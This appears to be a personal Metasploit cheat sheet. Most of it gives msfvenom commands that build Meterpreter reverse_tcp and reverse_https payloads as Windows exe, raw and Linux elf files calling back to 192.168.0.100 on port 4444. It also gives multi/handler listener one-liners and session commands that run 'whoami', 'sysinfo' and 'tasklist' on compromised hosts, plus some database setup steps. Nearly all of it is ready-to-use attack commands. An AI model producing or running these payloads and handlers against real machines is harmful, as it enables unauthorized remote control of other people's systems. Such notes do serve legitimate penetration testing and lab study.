DB
--- 

__msf db init:__  
>
> sudo systemctl enable postgresql  
> sudo systemctl start postgresql  
> sudo msfdb init  
>
> msfconsole -q  
> `msf > db_status`

__upd msf pg collation:__  
>
> sudo -u postgres psql  
> `# \l`  
> `# \c msf`  
> `# REINDEX DATABASE msf;`  
> `# ALTER DATABASE msf REFRESH COLLATION VERSION;`  
> `# \q`  

MTR
---

https://docs.rapid7.com/metasploit/use-meterpreter-locally-without-an-exploit/

> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 --format=exe > _mtr100t.exe  
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 --format=exe > _mtr100t_x64.exe  

> `msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set ExitFunc thread;set ExitOnSession false;set LHOST 192.168.0.100;set LPORT 4444;run"`

> msfconsole -q  
>
> `msf > use exploit/multi/handler`    
>
> `msf > set PAYLOAD windows/meterpreter/reverse_tcp`  
> `msf > set LHOST 192.168.0.100`    
> `msf > set LPORT 4444`    
> `msf > set ExitOnSession false`    
> `msf > exploit -j`

> `msf> jobs -l`  
> `msf> sessions -l`
  
> `msf> run -j # run -jz # run`

`help`  
> `msf> sessions -h`  
> `msf> run -h`
> `msf> jobs -h`
 
`sessions`  
> `msf > sessions -l   # list all sessions`  
> `msf > sessions -i 1 # switch to session 1`

> `msf > sessions -n session_name_one -i 1 # set session name`  

> `msf > sessions -i 1 -c "whoami" # run sys cmd at 1 session `  
> `msf > sessions -i 1 -C "sysinfo" # run mtr cmd at 1 session`  

> `msf > sessions -c "tasklist" all # run sys cmd at all sessions`  

> `msf > session -K # kill all sessions`  
> `msf > sessions -k 1 # kill 1 session`  

> `meterpreter > background # current session to background`  
> `meterpreter > exit # exit from current session`  

---

> msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.100 LPORT=4444 -f raw -o _mtr100h.bin  
> msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.100 LPORT=4444 -f exe -o _mtr100h.exe  

> `msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set ExitOnSession false;set ExitFunc thread;set LHOST 192.168.0.100;set LPORT 4444;run"`  

> msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f elf -o _mtr100t_x64.elf  
> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.120 LPORT=4444 -f elf -o _mtr120t_x86.elf  

> `msfconsole -q -x "use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set ExitOnSession false; set LHOST 192.168.0.100;set LPORT 4444;run"`  

---
  